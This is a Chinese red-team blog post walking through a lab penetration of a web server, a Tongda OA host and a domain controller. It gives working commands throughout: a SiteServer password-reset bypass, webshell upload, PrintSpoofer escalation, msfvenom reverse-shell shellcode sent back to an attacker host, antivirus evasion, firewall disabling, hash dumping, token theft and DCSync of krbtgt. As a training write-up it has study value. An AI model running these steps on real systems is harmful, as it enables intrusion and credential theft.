\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/kE1vw3S-Hri19UzfN9TMEg)

渗透攻击红队

一个专注于红队攻击的公众号

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDoZibS8XU01CtEtSbwM3VGr3qskOmA1VkccY0mwKTCq6u2ia1xYRwBn3A/640?wx_fmt=jpeg)

  

  

大家好，这里是 **渗透攻击红队** 的第 **31** 篇文章，本公众号会记录一些我学习红队攻击的复现笔记（由浅到深），不出意外每天一更

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC4T65TNkYZsPg2BJ2VwibZicuBhV9DGqxlsxwG0n2ibhLuBsiamU7S0SqvAp6p33ucxPkuiaDiaKD6ibJGaQ/640?wx_fmt=gif)

环境

windows 2016 web：192.168.2.29 - www.moonlab.com（外网）、10.10.1.131（内网）

  

windows server 2012  OA：10.10.10.166（内网）、10.10.1.130（内网）

  

windows server 2016 DC：10.10.10.165（内网）  

  

目标 web 有 iis 安全狗和防火墙、目标 OA 有 360 全家桶

  

运用到到技术：
-------

siteserver 禁用 JS 得到后台账号密码

  

siteserver 后台模版 getshell

  

工作组下的内网渗透

  

MSF 进行远程加载 shellcode 实现免杀绕过安全狗

  

通达 OA 获取 webshell

  

域环境下的内网渗透

  

MSF 进行本地加载 shellcode 实现免杀绕过 360 全家桶

  

命令行渗透

  

... 等等

**渗透过程**

**信息搜集**

首先使用 nmap 对目标进行扫描：

```
nmap -A -p- -sV 192.168.2.29
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByExAcaqGVgXwoK5tWHtaBcZVN1vyf1T4yw0kD2NzqBaHT5mMpKSicIpg/640?wx_fmt=png)

发现目标开放了 21（ftp）、80（http，iis10）、999（http，phpmyadmin）、5985（http）、6588（http），有一个域名（www.moonlab.com）

由于手工测试目标 WEB 有安全狗：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EBy3WzWZHB4pSfGDmW2EoyvMzE4klibuRI5llMk8Xib3L9v8FjhpMfg8kWw/640?wx_fmt=png)

那么我们在扫描目录文件的时候，需要吧线程调到最小，我这里使用的扫描工具是 dirb：  

```
dirb http://www.moonlab.com/ /usr/share/wordlists/dirb/small.txt -z 1000
# -z  线程设置为1秒
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByM887W0Tibibh5JjMxb9gN4Z7kHsGkCDlKvmX5totsHKf0jkh7aQYNq0w/640?wx_fmt=png)

其他的目录文件都没用，只有这个目录打开是一个后台页面：/siteserver/

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByX8oMP6zcHlbaPcSfKhibUHHXG4d2VzdK641NSNGmteI1UIdibB7wBrTQ/640?wx_fmt=png)

**SiteServer 禁用 JS 获取后台账号密码**

看到这个 CMS（siteserver），我想起了之前遇到过一个站，可以禁用 JS 来找回后台管理员密码，具体操作在'忘记密码'，输入'admin'，'禁用 JS'，然后就能获取到'admin'的密码了：

我用到的插件是：Quick Javascript Switcher

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EBy7MziaOGiaQLQq9EHLG6ibp2QLb0pRIBQ6kQdxMORV3Bqml6jQRHplxcSw/640?wx_fmt=png)

在忘记密码页面处，先输入后台账号名 admin，然后禁用掉 JS，之后点击下一步：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EBykYCxUico7DxXMDeiaD1Xa877eME20AzB3gibxn7qxpY2ukP17nasX45RQ/640?wx_fmt=png)

之后什么都不用填，一直下一步就可以：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EBy2UG2u6UFEQrvg4b4us0EnBKghCibIxe0rOXyXib8K5p5GxZ7icoU4Mic6g/640?wx_fmt=png)

这个时候就能够成功获取到目标后台的账号密码：admin：admin5566

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByTUvGpKKuBFOvicE4yvspz7PdpzjUABZf2ggpMvzVf0UzkrfGoQ1jibrg/640?wx_fmt=png)

成功登陆后台系统：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EBy3PIExXhF9icxb1pyJjkqVsXwGrvaicbefyEvFyzQVoIETDHXMBaMPGKg/640?wx_fmt=png)

**SiteServer 后台模板 Getshell**

具体拿 shell 方法在'系统管理'，'站点模版管理'，'导入站点模版'，把我们的过狗 aspx 的一句话压缩为 rar 上传到目标模版里：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByvFYIpT865o8HSYZ4bdah5WwVqalOOhFic2ex7wpaJAkZwbDuiaooa5LA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByTBnq5JwPr1AnBIIt9KR6VqHBfSpjgqfFj7T592u9U36oDibHxx4XEmg/640?wx_fmt=png)

之后得到 webshell：http://www.moonlab.com/sitefiles/sitetemplates/c32as/c32as.aspx

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EBya7efhELpABeA6sJQTMDsfctBx5lwUzXr2JNKs7HdwFCAguRPvlnrVw/640?wx_fmt=png)

**Webshell 工作组下的内网渗透**

拿到 shell 之后需要对目标进行内网渗透，渗透前需要搜集信息判断目标是工作组还是域环境，两种环境渗透思路不一样：systeminfo

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EBywPRYjfv6wrdII3MGk3QQXKW1r79PnWkRbP6ztrUH97iaMDYNJomewag/640?wx_fmt=png)

发现目标主机是 Windows Server 2016 对，是工作组环境，而且补丁没怎么打过.

whoami 发现是一个 iis 的普通权限：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EBytsyU7gmlMTdiaqhiarnNzBMukUtLyOump9RnLbaxR9ichC9gbbVSavULw/640?wx_fmt=png)

并且发现目标主机上有 iis 安全狗：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EBy959KpN4jr9qPib5cgKFpQFt0LdDRnT25iaw5kYhhQ6Kdtk1G1JOhlIOw/640?wx_fmt=png)

针对于 windows 2016 可以使用 SeImpersonatePrivilege 来进行本地提权：https://github.com/itm4n/PrintSpoofer

我吧 PrintSpoofer.exe 上传到主机临时目录下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByTWYB91fE8oa2knl3JtvFPjN0WNZsJEUdSen8nZpgKVEia1z64eMwXuw/640?wx_fmt=png)

之后运行命令成功提权：  

```
PrintSpoofer.exe -i -c whoami
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByhy0FEia7DfNG3op1riaXeOHIrUhjYUicqico2qVYjYFx5XEJxc0EcLrIXA/640?wx_fmt=png)

之后为了进行有效的内网渗透得想办法让目标上线 MSF 或者 CS，既然目标上面有安全狗，那么我们一定要做好免杀！

**Metasploit 下远程加载 Shellcode 实现免杀**

首先使用 MSF 生成一个 Shellcode：实现混淆加密

```
msfvenom -p windows/meterpreter/reverse\_tcp LHOST=192.168.2.12 LPORT=53 -b '\\x00' -f c |grep -v unsigned|sed "s/\\"\\\\\\x//g"|sed "s/\\\\\\x//g"|sed "s/\\"//g"|sed ':a;N;$!ba;s/\\n//g'|sed "s/;//g"
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByLTwFb6XictobPPo46IaYCIMfkSxl2Kkpwhd2ZnX9VQLH4PibObmLbCqw/640?wx_fmt=png)

得到 shellcode：

```
bea02e598adbced97424f45a2bc9b15631721383c2040372afccac7647924f8797f3c662a633bce79883b6aa146f9a5eaf1d335018ab655f998056fe19db8a202014df21654912733e0581644b531a0e07751af3df740ba2542f8b44b95b825ede665cd4141c5f3c65ddcc014a2c0c456ccf7bbf8f727c04f2a8099f543aa97b65ef2c0f69443a576d5befe389d00e2418a234e0417054b12fd769a19088cfa93cdc7df028114c0ba83dc7789ae27317966b5ae0af7c5d3e17eca3bf672460eb375e4194dc9e6e414895f8aa24abe44236ac14a6bf4a4498efc225484fb3cd8240eceeac8b85854265fd31fa2c75a303fbf3e3880903ad787817da1e82e71b8b828d1f1dd539227811e6ddaf22e1222e129915a41af559289a050c229a6de816c988f7827e01622dd6f52545d42001ca2707110dd7d53eb6bf257f463f4c7f16579b509997647bf2bfefeab05eef2614fef0c58df18ba632f26baf56f36bcf68c8bdf61e0f7e4d103a23e4bb4477f6e9
```

然后监听 kali 的 8080 端口：

```
ruby shellcode.rb 8080
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EBydZuPssr0ibOdY07DPNYMon5UEp8SltLYWrZHk5j4ialwU65mhz6Aypew/640?wx_fmt=png)

之后设置 MSF 监听模块进行监听：

```
use exploit/multi/handler
set payload windows/meterpreter/reverse\_tcp
set lhost 192.168.2.28
set lport 53
exploit
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByBiabzTdwl7cQdaiaK7CxibcjxXtTNwHaEdRyFFIOKpXHTDiaicYwDIicwtTw/640?wx_fmt=png)

随后使用吧 shellcode 加载器上传到目标服务器配合 PrintSpoofer.exe 然后远程加载 kali 的 shellcode 成功上线：

```
PrintSpoofer.exe -i -c "shellcode.exe 8080 192.168.2.28"
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByLEvtEepX35c9JqP5ZbaQZr5zfynBVU5oIyo6hadmYL7RAow14mLicUw/640?wx_fmt=png)

这个时候就是一个系统权限：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByvDJwpc4y5mRibrW3XuQeDM3JEQKLHBGOQjjKF5Ef1iaURPVrjibuQjia8g/640?wx_fmt=png)

因为我们的权限是一个 32 位的权限，所以我们需要对目标主机进行权限维持，吧权限迁移到 64 位到 system 权限上：  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EBySS8TDWhl8EyWJVc5VwibboNonDMibboicHLYRFesasEwSZx2UyRk7A1ibg/640?wx_fmt=png)

之后加载 mimikatz 抓取密码发现没抓到 hash 值：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByfNynO7EZ6fzMOUfib8U8nfmIicMVniblx1ATVNCT3LRPbq4tiarRVRZUQg/640?wx_fmt=png)

我们就用 MSF 到后渗透 post 模块来抓 hash：post/windows/gather/smart\_hashdump  

```
可以使用下面两种方法：
hashdump  
run post/windows/gather/smart\_hashdump  这个不太准，有的时候hash是一样的


meterpreter > hashdump 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e7114141b0337bdce1aedf5594706205:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
huweishen166644:1004:aad3b435b51404eeaad3b435b51404ee:93a50f03c4bc59579605ee0c1937401a:::
moonlab:1010:aad3b435b51404eeaad3b435b51404ee:16607206dae8e7ac67ccbbce40363686:::
MySQL\_HWS:1001:aad3b435b51404eeaad3b435b51404ee:c5bf79ff3e413dd56c626aaed26431bb:::
PhpMyAdmin\_HWS:1002:aad3b435b51404eeaad3b435b51404ee:8ad7000c1e4378339c86952dd7dc23e1:::
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByEUDibeiajqgC2m2ahWTtF66iaxOQFFqeaf6mPEafzICdKMXwMgPy456ug/640?wx_fmt=png)

之后通过 md5 解密得到 administrator 的密码为：!@#QWE123

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EBylVzg43XwCEhJlibk7zoTIFd6yNAk7thqJmf3eYqPvJ4ejBbuTUU2lXg/640?wx_fmt=png)

由于目标是没有开放 3389 远程桌面的，我们如果想要登陆目标远程桌面的话，需要给他开启一下：

```
run post/windows/manage/enable\_rdp
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByYTiaIpdMNJJk9qgI2J80mOh52PcB2a83qaU4qcgA1PGMA3MNNWO4Dvw/640?wx_fmt=png)  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByWOSvb8J50oOPaQ2bq2YK9ibvytUF3M7Gj9SV13vHrVmCcUFMdPUZZZg/640?wx_fmt=png)  

一般没必要登陆到目标远程桌面！

之后对他内网主机进行搜集，先看看 ip 网段：

```
run get\_local\_subnets
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EBy2fqyDf0ZqmqfunLUkGqKYWaCFiayTBbGmtrNDEs4sSyNKwLUgmH3t9w/640?wx_fmt=png)

发现目标有两个网段，一个 192.168.2.0 外网，一个 10.10.1.0 内网网段。

随后添加一个 10.10.1.0 的路由进行内网扫描：

```
run autoroute -s 10.10.1.0/24
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByQ7HPBeib9nZUfQGvVd1G6MlUjNicsFnA5DpN2nGaSURLDsYP8gkmWNWg/640?wx_fmt=png)

然后使用 arp 模块对内网进行扫描存活主机：

```
run arp\_scanner -r 10.10.1.0/24
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByVX0VibSFZ5GKrert52I6Wicbjz4DxQHp0klAziaRlY3frhicDlfFIVWzlw/640?wx_fmt=png)

发现目标 10.10.1.130 存活，这个时候就可以对目标进行更详细的信息搜集了！

因为是内网，所以我们需要做一层代理，吧 web 这台机器当作跳板来使用。

先添加一个 socks 代理：

```
use auxiliary/server/socks4a
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EBy9oT6YMxZbvfzKK6ZJ63ibWqNJfnxcVwH0OUN1QiafH7nDaw4c5jjaomQ/640?wx_fmt=png)

然后修改一下 proxychains.conf 文件：端口也修改为 MSF 对 1080 端口

```
vi /etc/proxychains.conf
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByQ2OPX7lkUEB2rXLBaAhHrSrck6xHUFJic4ywVKz9pWBhlB1U19a48HQ/640?wx_fmt=png)

之后就可以对 10.10.1.130 内网进行端口扫描了：扫描只能使用 tcp 扫描

```
proxychains nmap -sT -Pn -p 1-65535 10.10.1.130
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByEAtiaWqort8SoxmDY7eAXIbtSA409RwicVib3wmJO9f1vibrVUgGeicn5Hw/640?wx_fmt=png)

然后发现目标 10.10.1.130 只开放了 80 端口，估计有防火墙，那么我们就来打开看看目标的 web，这里一定要使用 proxychains 来打开浏览器！

```
proxychains firefox
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByqAPqQgPfKHdW4CGjyA4LGpiaicKvEOICuJeKUcbDDbqptZicKeYww6Xibg/640?wx_fmt=png)

发现目标 80 是一个通达 OA 系统！既然是通达 OA，那么根据之前 HW 的漏洞，找到了一个针对于通达 OA 的 rce 利用的 exp：

```
git clone https://github.com/wikiZ/tongda-exp-poc
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByU1A3cxfXUQemYVPvIOiayuXmHEIN96ictATFCqMe4TR4c9HicHgfQonIw/640?wx_fmt=png)

然后运行 exp ：

```
proxychains python3 tongda\\ exp.py -H http://10.10.1.130 -file-shell
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EBymz9KQS275QT58FBdHrUf4XUuqFaVPTnjapJP7etFEvo7icQKZ8ZIJWw/640?wx_fmt=png)

得到一枚 webshell：http://10.10.1.130/ispirit/interface/xiaoma.php

然后使用蚁剑链接前要设置一下 socks4 代理，代理服务器填写 kali 的 ip，端口填写 1080:

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByucCAibcBzUVt5M9bUhYsxIf1Krp6mu0y1A47v0gCdtE9eKs2ElwCSIg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByyzJUW7FWV6AS3yibgk9L2jpYNHdPv9VP1fZvhqPWjpPhczwcIyEQlxA/640?wx_fmt=png)

**OA 下的域内渗透**

首先拿到 shell 先看看是什么权限：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByE8NvFQG8fhicZkZEnfx1ZTgWOeqBdQ5Eo0cwicuQQkIYRB9hyeBDMUgg/640?wx_fmt=png)

当前权限是一个系统权限，还是挺不错的！

随后 ipconfig 发现目标是一个域环境，而且是双网卡，10.10.1.130、10.10.10.166:

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByhbM5FpZGncUx8zvCycxQSibDYesjd5icQoDHgDq7ZJwXo2Mica6rcsKdg/640?wx_fmt=png)

然后查看进程 tasklist 发现目标进程是有 360 杀毒全家桶的：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByic5db9Mu8smJY3r1FtRibDlmfGa7p1PrTtctGP8kzRH7ibpm3iaGgCXvow/640?wx_fmt=png)

查看目标服务也能看到目标有 360 全家桶和防火墙：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByq02bd5JAZAKMFxzX7TvL45SEzwhnXRm9SkMYz5XPLW40memQdicY5mw/640?wx_fmt=png)

由于目标防火墙（windows firewall）可能会对我们的操作有影响，我们直接使用命令给他关掉：

```
Netsh advfirewall set allprofiles state off
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByic6mmYicVvh06U8RsE9Bp8WaHqqgbN7CrA3pq3xo8YLWdxYicvxDjOJyw/640?wx_fmt=png)

**Shellcode 本地加载实现免杀绕过 360 全家桶**

既然拿到 shell 了，那么先让目标上线到 MSF 吧，首先使用 MSF 生成一个 shellcode 正向木马：

```
msfvenom -p windows/meterpreter/bind\_tcp  lport=9898 -e x86 /ikata\_ga\_nai -i 5 -f raw > test.c
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByIzeXUGLxfJY7qKtnxtKQzn82nuYp9CPOm87w1xZxqmhVdpMcuPue5g/640?wx_fmt=png)

然后 MSF 设置监听：

```
proxychains msfconsole 
use exploit/multi/handler
set payload windows/meterpreter/bind\_tcp
set lport 9898
set rhost 10.10.1.130
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByliaUVshOkfDMfzdrU1rruQIvNMJOPq2tn7ZdMTKoexnL93IRjkMtZGQ/640?wx_fmt=png)

然后吧 test.c 和 shellcode 加载器上传到目标机器上运行成功上线：

```
shellcode\_launcher.exe -i test.c
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByxf8sIsLKTlDQejGuFhicvsvWwanCX1NCxicg5VCQxrrpRtXuIjEc9nyA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EBys7TTS0SMhmiaUvYYT4JPGiaYPe4bQkuA00ZOvn1lPHtxcbb4s3NwHynw/640?wx_fmt=png)

拿到 meterpreter 先进行权限维持，迁移一下进程：

```
migrate 5432
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EBy3EJXGbhib09iaBEiaYH4ZicPwdtaf5jyAJvCJZiaAGKSC9W3sswibkTPyTAQ/640?wx_fmt=png)

hashdump 抓到 administrator 的 hash：

```
meterpreter > hashdump 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:357bec0ee1f524c62ba536fcd3f74472:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByz80hGVKe8WwGYvpAFUibUoGeP3toFhqvaxnbFsoqxBbc5g1uCsjpkQg/640?wx_fmt=png)

既然是域环境，那么先定位一下域控吧：

```
run post/windows/gather/enum\_domain
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByvXqRcicfZRvBAXbJ2fNJphWIBE56MwUiagfCU4h7SGmqYbqVFfDImqIw/640?wx_fmt=png)

发现域名是 attack，域控 dc 的 ip 为 10.10.10.165，而当前主机的另一个内网网卡 ip 为 10.10.10.166 .

还可以查看登陆的用户和 sid 信息：

```
meterpreter > run post/windows/gather/enum\_logged\_on\_users 

\[\*\] Running against session 1

Current Logged Users
====================

 SID                                          User
 ---                                          ----
 S-1-5-18                                     NT AUTHORITY\\SYSTEM
 S-1-5-21-4052809752-717748265-227546684-500  ATTACK\\administrator


\[+\] Results saved in: /root/.msf4/loot/20201117155658\_default\_10.10.1.130\_host.users.activ\_526094.txt

Recently Logged Users
=====================

 SID                                           Profile Path
 ---                                           ------------
 S-1-5-18                                      %systemroot%\\system32\\config\\systemprofile
 S-1-5-19                                      C:\\Windows\\ServiceProfiles\\LocalService
 S-1-5-20                                      C:\\Windows\\ServiceProfiles\\NetworkService
 S-1-5-21-3252981389-920624007-1327000051-500  C:\\Users\\Administrator
 S-1-5-21-4052809752-717748265-227546684-1103  C:\\Users\\oa
 S-1-5-21-4052809752-717748265-227546684-500   C:\\Users\\administrator.ATTACK
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByfxiaib2A0gOx6RR2DzNINPUbCjvMabiawwMMaLX7tv5YwmMCzMXnDh3QQ/640?wx_fmt=png)

sid 做票据传递攻击会使用到，所以我们先搜集到。

查看域内主机有那些：

```
run post/windows/gather/enum\_ad\_computers
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByXKaSGLOZdJGmlWGc9iaof7DdVD00c6mM6BgUYqOKTiaGmicSa2jIaH5Ew/640?wx_fmt=png)

发现只有当前 OA 还有一台域控 DC。

接下来尝试进行令牌窃取，因为有域控进程：

相关文章可以看我博客：http://www.saulgoodman.cn/metasploit-10.html

```
use incognito
list\_tokens -u
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EBy1YibMT9GMHUWBHqHTwTBJfLMhdkOf7DI9Xia0UCbHFkhAtcFsH4vLp2Q/640?wx_fmt=png)  
接下来切换域管的令牌：

```
impersonate\_token 'ATTACK\\administrator'
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EBylzicjttjHADicMN27GpbtQlUNxicbBDvKovib33Nkg2ibwC7PlYfCpoKQKA/640?wx_fmt=png)

成功拿到域管的权限（令牌窃取并不等于提权）。

这个时候渗透已经完成 80% 了。

因为我们到目标是拿到域控制器这台主机，因此我们还需要进行更深的内网渗透，所以我再做一层代理：获取网段

```
run get\_local\_subnets
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EBytnLJmrmM6HkEKsOFL4auvdewibqoKTV8xCncgG17vcaiau0kCbNib7qWA/640?wx_fmt=png)

由于刚刚我们搜集到的信息域控是在 10.10.10.0 这个网段，那么我们为它添加一个路由：  

```
run autoroute -s 10.10.10.0/24
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByjdlzib2Y4lic9k9IiciaTy0ub6SYS8LnRQ8tr5VKia7oGxebb3fy5Kjcgng/640?wx_fmt=png)

随后对域控 dc 进行端口扫描：

```
proxychains nmap -sT -Pn 10.10.10.165 -p 80,89,8000,9090,1433,1521,3306,5432,445,135,443,873,5984,88,6379,7001,7002,9200,9300,11211,27017,27018,50000,50070,50030,21,22,23,2601,3389 --open
```

但是没有扫描到：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByxR5JEuotgyBGq69CSdAop9XT6xGJdf1ePpPEm8ezog1kbbq5yLvP0g/640?wx_fmt=png)

估计目标域控有防火墙及杀软！

我们加载一下 MSF 自带的 kiwi：

```
load kiwi
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByAWBzANuI2IneQLveIE51eebLNrd6JacEkh2fX5Rib2sdFYsVJodUia2w/640?wx_fmt=png)

然后窃取一个域管的权限令牌：

```
steal\_token 3856
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByHSnxCRrKCwMZsKq9hoMYHKDySs75kHzcLF0cMMJslvetCeV0RLKObQ/640?wx_fmt=png)

这个时候就拿到了域管的 ntlm-hash、sid：

```
meterpreter > dcsync\_ntlm administrator
\[+\] Account   : administrator
\[+\] NTLM Hash : ccef208c6485269c20db2cad21734fe7
\[+\] LM Hash   : e1ba1721b0d8ed3a7636018c9337380c
\[+\] SID       : S-1-5-21-4052809752-717748265-227546684-500
\[+\] RID       : 500
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByzSibwh84x67OUOsu3bM4BOuYibOWlpl9hoibaGP1fiaNBibvFLOVF4lsP0g/640?wx_fmt=png)

这个时候也拿到了 krbtgt 的 ntlm-hash 和 sid：这个用户用于做黄金票据用的  

```
meterpreter > dcsync\_ntlm krbtgt
\[+\] Account   : krbtgt
\[+\] NTLM Hash : 67446f76100703cc0866cb7167cca084
\[+\] LM Hash   : c7192cc0c2c01aee95bc9a98664ed15b
\[+\] SID       : S-1-5-21-4052809752-717748265-227546684-502
\[+\] RID       : 502
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByhiajwf7fVR3qD2yicRWjJILUh1PmDzRO9qibckDFyY2Pa6zp9Ve6tXicZA/640?wx_fmt=png)

通过解密域管的密码我们得到密码为：Admin12345

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EBy23BIcjQbH7ficcPzWicXHMTVQsBTjQIynoZQ0hPzjP002z8EKhibkwxPQ/640?wx_fmt=png)

这个时候我们就可以通过与域控建立 IPC 链接：  

```
net use \\\\10.10.10.165 /u:attack\\administrator Admin12345
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EBy54NN7thL0pJpbhAgVV2D0Kxl8jKHhxjPYXEiaMFp7k043eYMzEDuxiaA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByGkJXJ3P0xVBGWJVcayZndWwRBdlmw42ib6luNgo3ZibK8LpEcKVleu5Q/640?wx_fmt=png)

最后也是在域控 10.10.10.165 主机下的 C:\\users\\administrator\\ 拿到了 flag，完成本次渗透！  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLs2Um4Lld90iaPyPATa3EByxpfiaib55ibPsrQAkS5KA3O5hLhH7fJzb9G0do0S8jWYUrhwna4GU5vEA/640?wx_fmt=png)

**总结**

  
这篇文章用到的技术还是挺多的，适合学习内网渗透的学习人员，本次靶场来自于暗月师傅的靶场，大家需要培训的话可以找暗月师傅。

喜欢这篇文章的话大家转发文章支持一下作者！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

渗透攻击红队

一个专注于渗透红队攻击的公众号

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDdjBqfzUWVgkVA7dFfxUAATDhZQicc1ibtgzSVq7sln6r9kEtTTicvZmcw/640?wx_fmt=jpeg)

